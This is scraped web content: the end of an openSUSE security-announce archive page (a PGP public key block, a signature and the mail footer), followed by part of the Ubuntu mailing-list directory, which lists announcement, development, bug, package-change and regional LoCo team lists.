v/kpg4xs1LthlhquhbHcKNoVTNspugiC3qMPyvSX4XcBr2PC0cVkS4Z9PY9iCfT+
x9WM96g39dAF+le2CCx7XISk9XXJ4ApEy5g4AuK7NYgAJd39PPbERgWnxjxir9g0
Ix30dS30bW39D+3NPU5Ho9TD/B7UDFvYT5AWHl3MGwo3a1RhTs6sfgL7yQ3U+mvq
MkTExZb5mfN1FeaYKMopoI4VpzNVeGxQWIz67VjJHVyUlF20ekOz4kWVgsxkc8G2
saqZd6yv2EwqYTi8BDAduweP33KrQc4KDDommQNDOXxaKOeCoESIdM4p7Esdjq1o
L0oixF12CohGBBARAgAGBQI7HmHDAAoJEJ5A4xAACqukTlQAoI4QzP9yjPohY7OU
F7J3eKBTzp25AJ42BmtSd3pvm5ldmognWF3Trhp+GYkAlQMFEDe3O8IWkDf+zvyS
FQEBAfkD/3GG5UgJj18UhYmh1gfjIlDcPAeqMwSytEHDENmHC+vlZQ/p0mT9tPiW
tp34io54mwr+bLPN8l6B5GJNkbGvH6M+mO7R8Lj4nHL6pyAv3PQr83WyLHcaX7It
Klj371/4yzKV6qpz43SGRK4MacLo2rNZ/dNej7lwPCtzCcFYwqkiiEYEEBECAAYF
AjoaQqQACgkQx1KqMrDf94ArewCfWnTUDG5gNYkmHG4bYL8fQcizyA4An2eVo/n+
3J2KRWSOhpAMsnMxtPbBmQGiBDnu9IERBACT8Y35+2vv4MGVKiLEMOl9GdST6MCk
YS3yEKeueNWc+z/0Kvff4JctBsgs47tjmiI9sl0eHjm3gTR8rItXMN6sJEUHWzDP
+Y0PFPboMvKx0FXl/A0dM+HFrruCgBlWt6FA+okRySQiliuI5phwqkXefl9AhkwR
8xocQSVCFxcwvwCglVcOQliHu8jwRQHxlRE0tkwQQI0D+wfQwKdvhDplxHJ5nf7U
8c/yE/vdvpN6lF0tmFrKXBUX+K7u4ifrZlQvj/81M4INjtXreqDiJtr99Rs6xa0S
cZqITuZC4CWxJa9GynBED3+D2t1V/f8l0smsuYoFOF7Ib49IkTdbtwAThlZp8bEh
ELBeGaPdNCcmfZ66rKUdG5sRA/9ovnc1krSQF2+sqB9/o7w5/q2qiyzwOSTnkjtB
UVKn4zLUOf6aeBAoV6NMCC3Kj9aZHfA+ND0ehPaVGJgjaVNFhPi4x0e7BULdvgOo
AqajLfvkURHAeSsxXIoEmyW/xC1sBbDkDUIBSx5oej73XCZgnj/inphRqGpsb+1n
KFvF+rQoU3VTRSBQYWNrYWdlIFNpZ25pbmcgS2V5IDxidWlsZEBzdXNlLmRlPohi
BBMRAgAiBQJA2AY+AhsDBQkObd+9BAsHAwIDFQIDAxYCAQIeAQIXgAAKCRCoTtro
nIAKypCfAJ9RuZ6ZSV7QW4pTgTIxQ+ABPp0sIwCffG9bCNnrETPlgOn+dGEkAWeg
KL+IRgQQEQIABgUCOnBeUgAKCRCeQOMQAAqrpNzOAKCL512FZvv4VZx94TpbA9lx
yoAejACeOO1HIbActAevk5MUBhNeLZa/qM2JARUDBRA6cGBvd7LmAD0l09kBATWn
B/9An5vfiUUE1VQnt+T/EYklES3tXXaJJp9pHMa4fzFa8jPVtv5UBHGee3XoUNDV
wM2OgSEISZxbzdXGnqIlcT08TzBUD9i579uifklLsnr35SJDZ6ram51/CWOnnaVh
UzneOA9gTPSr+/fT3WeVnwJiQCQ30kNLWVXWATMnsnT486eAOlT6UNBPYQLpUprF
5Yryk23pQUPAgJENDEqeU6iIO9Ot1ZPtB0lniw+/xCi13D360o1tZDYOp0hHHJN3
D3EN8C1yPqZd5CvvznYvB6bWBIpWcRgdn2DUVMmpU661jwqGlRz1F84JG/xe4jGu
zgpJt9IXSzyohEJB6XG5+D0BuQINBDnu9JIQCACEkdBN6Mxf5WvqDWkcMRy6wnrd
9DYJ8UUTmIT2iQf07tRUKJJ9v0JXfx2Z4d08IQSMNRaq4VgSe+PdYgIy0fbj23Vi
a5/gO7fJEpD2hd2f+pMnOWvH2rOOIbeYfuhzAc6BQjAKtmgR0ERUTafTM9Wb6F13
CNZZNZfDqnFDP6L12w3z3F7FFXkz07Rs3AIto1ZfYZd4sCSpMr/0S5nLrHbIvGLp
271hhQBeRmmoGEKO2JRelGgUJ2CUzOdtwDIKT0LbCpvaP8PVnYF5IFoYJIWRHqlE
t5ucTXstZy7vYjL6vTP4l5xs+LIOkNmPhqmfsgLzVo0UaLt80hOwc4NvDCOLAAMG
B/9g+9V3ORzw4LvO1pwRYJqfDKUq/EJ0rNMMD4N8RLpZRhKHKJUm9nNHLbksnlZw
rbSTM5LpC/U6sheLP+l0bLVoq0lmsCcUSyh+mY6PxWirLIWCn/IAZAGnXb6Zd6Tt
IJlGG6pqUN8QxGJYQnonl0uTJKHJENbI9sWHQdcTtBMc34gorHFCo1Bcvpnc1LFL
rWn7mfoGx6INQjf3HGQpMXAWuSBQhzkazY6vaWFpa8bBJ+gKbBuySWzNm3rFtT5H
RKMWpO+M9bHp4d+puY0L1YwN1OMatcMMpcWnZpiWiR83oi32+xtWUY2U7Ae38mMa
g8zFbpeqPQUsDv9V7CAJ1dbriEwEGBECAAwFAkDYBnoFCQ5t3+gACgkQqE7a6JyA
CspnpgCfRbYwxT3iq+9l/PgNTUNTZOlof2oAn25y0eGi0371jap9kOV6uq71sUuO
=ypVs
- -----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.15 (GNU/Linux)
iQEVAwUBTMlhMney5gA9JdPZAQLXMQf/RegQ1cqhv5Fr+QZco4FSvGjLgXUw5ND5
aJLkQHivlPkuoCEOAIGQa9MAIvZgEbYl0kSlCzfHWpaUlwWUUQaXD3pST1DBj9z9
kdjyPfBPrZnLw2nSrsGr2T6lLmM06w3bpcaW+T8AHEmBAEghagqZQb0WwRnvJxXR
ZHTy4GHIBtXvwNeNvCmLjTzPsbeH+4MBCWNm2+7Cfa/nmzTnsFDxZiD7gLvUjXQp
g7AUnxvJHgDM58IL2DoU1m1WZ7wMzjlOMVMDZTQn+Z9o5KoBGhcuWjHngP1mTVgr
P0VmiH20coJFubmFY2XiCf2PRPSsu1yK4YkKrNHvmuPGyysU0D9teg==
=2x5y
-----END PGP SIGNATURE-----
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ/#SLCS75X6LOOCU3QQQTFK7MGGI6FQZCYQ)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from lists.ubuntu.com_7341ebd6_20250126_124103.html ===

[![](http://assets.ubuntu.com/sites/ubuntu/latest/u/img/logos/logo-ubuntu-orange.png)
Mailing lists](http://community.ubuntu.com/)

# Mailing Lists

Below is a listing of all the public mailing lists on lists.ubuntu.com. Click on a list name to get more information about the list, or to subscribe, unsubscribe, and change the preferences on your subscription.

List administrators, you can visit [the list admin overview page](https://lists.ubuntu.com/mailman/admin) to find the management interface for your list.

If you need help with your Ubuntu system, please try one of the [Community Support Lists](#Community+Support) below.
If you are having trouble using the lists themselves, please contact mailman@lists.ubuntu.com.

**Categories**

1. [Ubuntu Announcements](#Ubuntu+Announcements)
2. [Community Support](#Community+Support)
3. [Announcement Lists](#Announcement+Lists)
4. [Development Lists](#Development+Lists)
5. [Quality Assurance and Related Lists](#Quality+Assurance+and+Related+Lists)
6. [Bug Lists](#Bug+Lists)
7. [Package Upload and Automatic Notification Lists](#Package+Upload+and+Automatic+Notification+Lists)
8. [Ubuntu Worldwide LoCo Teams](#Ubuntu+Worldwide+LoCo+Teams)
9. [Localization Lists](#Localization+Lists)
10. [Other Ubuntu Projects and Groups](#Other+Ubuntu+Projects+and+Groups)
11. [Bazaar-related Lists](#Bazaar-related+Lists)
12. [Storm Lists](#Storm+Lists)
13. [Discontinued (Historical) Lists](#Discontinued+%28Historical%29+Lists)

## Ubuntu Announcements

* [ubuntu-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-announce) -
  Ubuntu Announcements

## Community Support

* [ubuntu-users](http://lists.ubuntu.com/mailman/listinfo/ubuntu-users) -
  Ubuntu user technical support, not for general discussions
* [edubuntu-users](http://lists.ubuntu.com/mailman/listinfo/edubuntu-users) -
  Edubuntu Users Help and Discussion
* [kubuntu-users](http://lists.ubuntu.com/mailman/listinfo/kubuntu-users) -
  Kubuntu user technical support
* [launchpad-users](http://lists.ubuntu.com/mailman/listinfo/launchpad-users) -
  Discussion for Launchpad users
* [lubuntu-users](http://lists.ubuntu.com/mailman/listinfo/Lubuntu-users) -
  Lubuntu Help and User Discussions
* [ubuntu-studio-users](http://lists.ubuntu.com/mailman/listinfo/ubuntu-studio-users) -
  Ubuntu Studio Users
* [ubuntukylin-users](http://lists.ubuntu.com/mailman/listinfo/Ubuntukylin-users) -
  Ubuntu Kylin Support and User Discussions
* [xubuntu-users](http://lists.ubuntu.com/mailman/listinfo/xubuntu-users) -
  Xubuntu Support and User Discussions

## Announcement Lists

* [bazaar-announce](http://lists.ubuntu.com/mailman/listinfo/bazaar-announce) -
  Announcements for the Bazaar project
* [community-announce](http://lists.ubuntu.com/mailman/listinfo/Community-announce) -
  Community announcement list
* [fwts-announce](http://lists.ubuntu.com/mailman/listinfo/Fwts-announce) -
  Firmware Test Suite Announcements
* [kernel-sru-announce](http://lists.ubuntu.com/mailman/listinfo/Kernel-sru-announce) -
  For announcement of things impacting the kernel sru cycle
* [launchpad-announce](http://lists.ubuntu.com/mailman/listinfo/Launchpad-announce) -
  Launchpad.net Announcements
* [snapcraft-announce](http://lists.ubuntu.com/mailman/listinfo/Snapcraft-announce) -
  To coordinate snapd packaging notifications
* [ubuntu-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-announce) -
  Ubuntu Announcements
* [ubuntu-cloud-announce](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cloud-announce) -
  Official announcements about Ubuntu Cloud and Guests
* [ubuntu-devel-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-devel-announce) -
  Developer-related announcements and information
* [ubuntu-mirrors-announce](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mirrors-announce) -
  Ubuntu Mirror Announcement List
* [ubuntu-news](http://lists.ubuntu.com/mailman/listinfo/ubuntu-news) -
  News about Ubuntu interesting to users and developers alike
* [ubuntu-security-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce) -
  Ubuntu Security Announcements

The mailing list snapcraft is private and not meant to be indexed.
## Development Lists

* [ubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-devel) -
  Ubuntu Development (developers)
* [ubuntu-devel-discuss](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-devel-discuss) -
  Ubuntu Development (users and developers)
* [checkbox-devel](http://lists.ubuntu.com/mailman/listinfo/Checkbox-devel) -
  Checkbox development
* [edubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/edubuntu-devel) -
  Edubuntu Development & Technical Discussion
* [edubuntu-devel-es](http://lists.ubuntu.com/mailman/listinfo/edubuntu-devel-es) -
  Edubuntu Hispanoparlantes
* [fwts-devel](http://lists.ubuntu.com/mailman/listinfo/fwts-devel) -
  Firmware Test Suite Development
* [kernel-team](http://lists.ubuntu.com/mailman/listinfo/kernel-team) -
  Kernel team discussions
* [kubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/kubuntu-devel) -
  Kubuntu Developer Discussion
* [lubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/Lubuntu-devel) -
  Lubuntu development, testing and bug management
* [maas-devel](http://lists.ubuntu.com/mailman/listinfo/Maas-devel) -
  Mailing list for discussing the development of MAAS
* [mir-devel](http://lists.ubuntu.com/mailman/listinfo/Mir-devel) -
  Mir Development
* [ubuntu-accessibility-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility-devel) -
  Ubuntu Accessibility development discussions
* [ubuntu-app-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-app-devel) -
* [ubuntu-archive](http://lists.ubuntu.com/mailman/listinfo/ubuntu-archive) -
  Ubuntu Archive Team discussion and co-ordination
* [ubuntu-desktop](http://lists.ubuntu.com/mailman/listinfo/ubuntu-desktop) -
  Desktop Team co-ordination and discussion
* [ubuntu-distributed-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-distributed-devel) -
  Discussion of the Ubuntu Distributed Development initiative
* [ubuntu-motu](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu) -
  mailing list of the Masters Of The Universe
* [ubuntu-release](http://lists.ubuntu.com/mailman/listinfo/ubuntu-release) -
  Ubuntu release co-ordination and discussion
* [ubuntu-server](http://lists.ubuntu.com/mailman/listinfo/ubuntu-server) -
  Ubuntu Server Development mailing list
* [ubuntu-studio-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-studio-devel) -
  Ubuntu Studio Development
* [ubuntu-utah-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-utah-devel) -
  Ubuntu Test Automation Harness Development discussion, for all those people wanting to contribute test cases and provisioning methods
* [ubuntukylin-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntukylin-devel) -
  Ubuntu Kylin Development Discussion
* [upstart-devel](http://lists.ubuntu.com/mailman/listinfo/upstart-devel) -
  Upstart development
* [xubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/xubuntu-devel) -
  Xubuntu Development Discussion
* [community-web-projects](http://lists.ubuntu.com/mailman/listinfo/community-web-projects) -
  Discussion list for all community web projects including LoCo Team Directory, Summit, Hall of Fame, Django Foundations and the community web themes.

The mailing list laptop-testing-team could not be found!
## Quality Assurance and Related Lists

* [ubuntu-quality](http://lists.ubuntu.com/mailman/listinfo/ubuntu-quality) -
  Ubuntu Quality Assurance (testing and bug triage) discussion list
* [ubuntu-bugsquad](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bugsquad) -
  Discussion about reporting, triaging and working with bugs

## Bug Lists

* [ubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bugs) -
  Ubuntu bug tracker changes - HIGH VOLUME
* [universe-bugs](http://lists.ubuntu.com/mailman/listinfo/universe-bugs) -
  Universe bug tracker changes - HIGH VOLUME
* [desktop-bugs](http://lists.ubuntu.com/mailman/listinfo/desktop-bugs) -
  Desktop bug tracker changes - HIGH VOLUME
* [kubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/kubuntu-bugs) -
  Kubuntu bug tracker changes
* [kernel-bugs](http://lists.ubuntu.com/mailman/listinfo/kernel-bugs) -
  Kernel Bugs tracking
* [ubuntu-accessibility-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility-bugs) -
  Bug contact for the Ubuntu Accessibility Team
* [foundations-bugs](http://lists.ubuntu.com/mailman/listinfo/foundations-bugs) -
  Ubuntu Foundations bug changes
* [ubuntu-openstack-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-openstack-bugs) -
  Ubuntu OpenStack Bug Mail
* [ubuntu-server-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-server-bugs) -
  Server bug tracker changes
* [xubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/Xubuntu-bugs) -
  Xubuntu Bugs Discussion

## Package Upload and Automatic Notification Lists

* [lucid-changes](http://lists.ubuntu.com/mailman/listinfo/Lucid-changes) -
  Lucid Lynx archive upload notification list
* [hardy-changes](http://lists.ubuntu.com/mailman/listinfo/Hardy-changes) -
  Hardy Heron archive upload notification list
* [artful-changes](http://lists.ubuntu.com/mailman/listinfo/Artful-changes) -
  Artful Aardvark changes
* [bionic-changes](http://lists.ubuntu.com/mailman/listinfo/Bionic-changes) -
  Bionic Beaver changes
* [cloud-archive-changes](http://lists.ubuntu.com/mailman/listinfo/Cloud-archive-changes) -
  Medium volume automatic messages of each package change in the cloud archive
* [cloud-tools-changes](http://lists.ubuntu.com/mailman/listinfo/Cloud-tools-changes) -
* [cosmic-changes](http://lists.ubuntu.com/mailman/listinfo/Cosmic-changes) -
  Cosmic changes
* [disco-changes](http://lists.ubuntu.com/mailman/listinfo/Disco-changes) -
  Disco changes
* [eoan-changes](http://lists.ubuntu.com/mailman/listinfo/Eoan-changes) -
  Eoan changes
* [focal-changes](http://lists.ubuntu.com/mailman/listinfo/Focal-changes) -
  Focal changes
* [groovy-changes](http://lists.ubuntu.com/mailman/listinfo/Groovy-changes) -
  Groovy changes
* [hirsute-changes](http://lists.ubuntu.com/mailman/listinfo/Hirsute-changes) -
* [impish-changes](http://lists.ubuntu.com/mailman/listinfo/impish-changes) -
* [jammy-changes](http://lists.ubuntu.com/mailman/listinfo/jammy-changes) -
* [kinetic-changes](http://lists.ubuntu.com/mailman/listinfo/kinetic-changes) -
* [lunar-changes](http://lists.ubuntu.com/mailman/listinfo/lunar-changes) -
  Lunar changes
* [mantic-changes](http://lists.ubuntu.com/mailman/listinfo/mantic-changes) -
  Mantic changes
* [maverick-changes](http://lists.ubuntu.com/mailman/listinfo/Maverick-changes) -
  Maverick Meerkat archive upload notification list
* [natty-changes](http://lists.ubuntu.com/mailman/listinfo/Natty-changes) -
  Natty Narwhal archive upload notification list
* [noble-changes](http://lists.ubuntu.com/mailman/listinfo/noble-changes) -
  Noble changes
* [oneiric-changes](http://lists.ubuntu.com/mailman/listinfo/Oneiric-changes) -
  Oneiric Ocelot archive upload notification list
* [oracular-changes](http://lists.ubuntu.com/mailman/listinfo/oracular-changes) -
  Oracular changes
* [plucky-changes](http://lists.ubuntu.com/mailman/listinfo/plucky-changes) -
  Plucky changes
* [precise-changes](http://lists.ubuntu.com/mailman/listinfo/Precise-changes) -
  Precise Pangolin archive upload notification list
* [quantal-changes](http://lists.ubuntu.com/mailman/listinfo/Quantal-changes) -
  Quantal Quetzal archive upload notification list
* [raring-changes](http://lists.ubuntu.com/mailman/listinfo/Raring-changes) -
  Raring Ringtail archive upload notification list
* [rtm-14.09-changes](http://lists.ubuntu.com/mailman/listinfo/Rtm-14.09-changes) -
  Ubuntu RTM archive upload notification list
* [saucy-changes](http://lists.ubuntu.com/mailman/listinfo/Saucy-changes) -
  Saucy Salamander archive upload notification list
* [trusty-changes](http://lists.ubuntu.com/mailman/listinfo/Trusty-changes) -
  Trusty Tahr archive upload notification list
* [ubuntu-patches](http://lists.ubuntu.com/mailman/listinfo/ubuntu-patches) -
  Ubuntu patch upload notifications - HIGH VOLUME
* [utopic-changes](http://lists.ubuntu.com/mailman/listinfo/Utopic-changes) -
  Utopic Unicorn archive upload notification list
* [vivid-changes](http://lists.ubuntu.com/mailman/listinfo/Vivid-changes) -
  Vivid Vervet archive upload notification list
* [wily-changes](http://lists.ubuntu.com/mailman/listinfo/Wily-changes) -
  Wily Werewolf changes
* [xenial-changes](http://lists.ubuntu.com/mailman/listinfo/Xenial-changes) -
  Xenial Xerus changes
* [yakkety-changes](http://lists.ubuntu.com/mailman/listinfo/Yakkety-changes) -
  Yakkety Yak changes
* [zesty-changes](http://lists.ubuntu.com/mailman/listinfo/Zesty-changes) -
  Zesty Zapus changes

The mailing list edubuntu-quebec is private and not meant to be indexed.
## Ubuntu Worldwide LoCo Teams

* [ubuntu-ae](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ae) -
  Ubuntu UAE Mailing List
* [ubuntu-af](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-af) -
  Afghanistan Ubuntu Loco Team
* [ubuntu-ar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ar) -
  Ubuntu User Group Argentina
* [ubuntu-at](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-at) -
  Ubuntu Austria LoCo Team Mailingliste
* [ubuntu-au](http://lists.ubuntu.com/mailman/listinfo/ubuntu-au) -
  Ubuntu in Australia
* [ubuntu-au-wa](http://lists.ubuntu.com/mailman/listinfo/ubuntu-au-wa) -
  Ubuntu Western Australia Local Community Team list
* [ubuntu-az](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-az) -
  Ubuntu Azerbaijan
* [ubuntu-ba](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ba) -
  Ubuntu LoCo tim Bosne i Hercegovine
* [ubuntu-bd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bd) -
  Ubuntu Bangladesh
* [ubuntu-be](http://lists.ubuntu.com/mailman/listinfo/ubuntu-be) -
  Ubuntu Belgium
* [ubuntu-bf](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bf) -
* [ubuntu-bg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bg) -
  Ubuntu users in Bulgaria
* [ubuntu-bh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bh) -
  Ubuntu users in Bahrain
* [ubuntu-bo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bo) -
  Lista de discusiÃ³n de Bolivia - Ubuntu LoCo Team
* [ubuntu-br](http://lists.ubuntu.com/mailman/listinfo/ubuntu-br) -
  Lista de discussÃ£o da Comunidade Ubuntu Brasil
* [ubuntu-bs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bs) -
* [ubuntu-by](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-by) -
  Ubuntu Belarus Team
* [ubuntu-ca](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ca) -
  The Canadian Ubuntu Users Community
* [ubuntu-cd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-cd) -
  Ubuntu Democratic Republic of Congo
* [ubuntu-ch](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ch) -
  Ubuntu Swiss Users
* [ubuntu-ci](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ci) -
  CommunautÃ© Ivoirienne UBUNTU
* [ubuntu-cl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cl) -
  Ubuntu Chile
* [ubuntu-cm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cm) -
  Ubuntu Cameroon Local Community Team
* [ubuntu-co](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-co) -
  Ubuntu Colombia
* [ubuntu-cr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-cr) -
  Costa Rica Ubuntu LoCoTeam
* [ubuntu-cu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cu) -
  Fraternidad de Ubuntu Cuba
* [ubuntu-cy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cy) -
  Ubuntu-cy LoCo Team
* [ubuntu-de](http://lists.ubuntu.com/mailman/listinfo/ubuntu-de) -
  Ubuntu-Diskussion
* [ubuntu-de-events](http://lists.ubuntu.com/mailman/listinfo/ubuntu-de-events) -
  Ubuntu auf Veranstaltungen im Raum DE.
* [ubuntu-dk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-dk) -
  Dansk mailingliste til det danske Ubuntu LocoTeam til diskussion/koordination af aktiviteter
* [ubuntu-do](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-do) -
  Ubuntu Dominican Republic
* [ubuntu-dz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-dz) -
  Ubuntu Algeria
* [ubuntu-ec](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ec) -
  Ubuntu-EC mailist
* [ubuntu-eg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-eg) -
  Ubuntu Egypt LoCo Team
* [ubuntu-es](http://lists.ubuntu.com/mailman/listinfo/ubuntu-es) -
  Asistencia para usuarios de Ubuntu en Castellano
* [ubuntu-es-es](http://lists.ubuntu.com/mailman/listinfo/ubuntu-es-es) -
  Ubuntu EspaÃ±a
* [ubuntu-et](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-et) -
  Ubuntu Ethiopia
* [ubuntu-fi](http://lists.ubuntu.com/mailman/listinfo/ubuntu-fi) -
  SÃ¤hkÃ¶postilista Ubuntu-keskustelulle (Ubuntu Finland)
* [ubuntu-fr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-fr) -
  Liste de discussion sur Ubuntu
* [ubuntu-ge](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ge) -
  Ubuntu Georgian Users Mailing List
* [ubuntu-gr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-gr) -
  Ubuntu Greece discussion list
* [ubuntu-gt](http://lists.ubuntu.com/mailman/listinfo/ubuntu-gt) -
  Ubuntu Guatemala
* [ubuntu-hk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hk) -
  Ubuntu HK LoCo Team
* [ubuntu-hn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-hn) -
  Ubuntu Honduras
* [ubuntu-hu](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hu) -
  Hungarian LoCo team mailing list
* [ubuntu-id](http://lists.ubuntu.com/mailman/listinfo/ubuntu-id) -
  Ubuntu User Group Indonesia.
* [ubuntu-ie](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ie) -
  Ubuntu Ireland Mailing List
* [ubuntu-in](http://lists.ubuntu.com/mailman/listinfo/ubuntu-in) -
  Ubuntu India Local Community
* [ubuntu-in-ap](http://lists.ubuntu.com/mailman/listinfo/ubuntu-in-ap) -
  Ubuntu Andhra Pradesh Local Community
* [ubuntu-ir](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ir) -
  Ubuntu Iranian Team Mailing List
* [ubuntu-it](http://lists.ubuntu.com/mailman/listinfo/ubuntu-it) -
  Supporto per gli utenti Italiani di Ubuntu
* [ubuntu-jo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-jo) -
  Ubuntu Jordan Local Community Team
* [ubuntu-jp](http://lists.ubuntu.com/mailman/listinfo/ubuntu-jp) -
  Ubuntu Japanese Local Community Team
* [ubuntu-ke](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ke) -
  Ubuntu Kenyan LoCoTeam Mailing List
* [ubuntu-kg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kg) -
  Ubuntu Kyrgyzstan
* [ubuntu-kh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kh) -
  Ubuntu Cambodia
* [ubuntu-ko](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ko) -
  Korean Ubuntu Users Mailing List
* [ubuntu-kur](http://lists.ubuntu.com/mailman/listinfo/ubuntu-kur) -
  Listeya bikarheneren Ubuntu ya kurdi
* [ubuntu-kw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kw) -
* [ubuntu-kz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kz) -
  Ubuntu Kazakstan Loco Team List
* [ubuntu-lb](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lb) -
  Ubuntu Lebanon Location Team
* [ubuntu-lk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lk) -
  Ubuntu Sri Lanka
* [ubuntu-lr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lr) -
  Ubuntu Liberia
* [ubuntu-lt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lt) -
  Ubuntu Lithuania
* [ubuntu-lu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lu) -
  Ubuntu Luxembourgian Users
* [ubuntu-lv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lv) -
  Ubuntu Latvijas kopiena
* [ubuntu-ma](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ma) -
  Ubuntu Moroccan Users
* [ubuntu-md](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-md) -
  Ubuntu Moldova
* [ubuntu-me](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-me) -
  Ubuntu Montenegro Loco Team
* [ubuntu-mg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mg) -
  Ubuntu Madagascar LoCo Team
* [ubuntu-mk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mk) -
  Ubuntu Macedonia LoCo Team
* [ubuntu-ml](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ml) -
  Ubuntu Mali
* [ubuntu-mt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mt) -
  Ubuntu Malta
* [ubuntu-mx](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mx) -
  Lista de correos de la comunidad de Ubuntu Linux en Mexico
* [ubuntu-my](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-my) -
  Malaysian Team Mailing List
* [ubuntu-mz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mz) -
  Ubuntu Mozambique LoCo List
* [ubuntu-na](http://lists.ubuntu.com/mailman/listinfo/ubuntu-na) -
  Ubuntu LoCo Team Namibia Mailing List
* [ubuntu-ne](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ne) -
  Ubuntu Niger
* [ubuntu-ng](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ng) -
  Ubuntu Nigeria
* [ubuntu-ni](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ni) -
  Lista de correos del Grupo Ubuntu Nicaragua.
* [ubuntu-nl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-NL) -
  Nederlandstalige Ubuntu ondersteuning en discussie
* [ubuntu-no](http://lists.ubuntu.com/mailman/listinfo/ubuntu-no) -
  Generell epost-liste for Ubuntu Norge
* [ubuntu-np](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-np) -
